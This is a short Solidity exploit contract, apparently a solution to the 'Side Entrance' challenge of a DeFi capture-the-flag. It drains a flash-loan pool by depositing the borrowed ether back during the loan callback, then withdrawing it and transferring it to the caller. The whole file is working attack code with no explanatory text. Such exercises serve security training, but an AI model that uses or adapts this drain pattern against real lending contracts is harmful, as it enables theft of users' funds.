// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './SideEntranceLenderPool.sol';

error Here(uint balance);

contract AttackerSide {
    function attack(address _pool) external {
        uint balance = _pool.balance;
        SideEntranceLenderPool(_pool).flashLoan(balance);
        SideEntranceLenderPool(_pool).withdraw();
        payable(msg.sender).transfer(balance);
    }

    function execute() external payable {
        uint balance = address(this).balance;
        SideEntranceLenderPool(msg.sender).deposit{value: balance}();
    }

    receive() external payable {}
}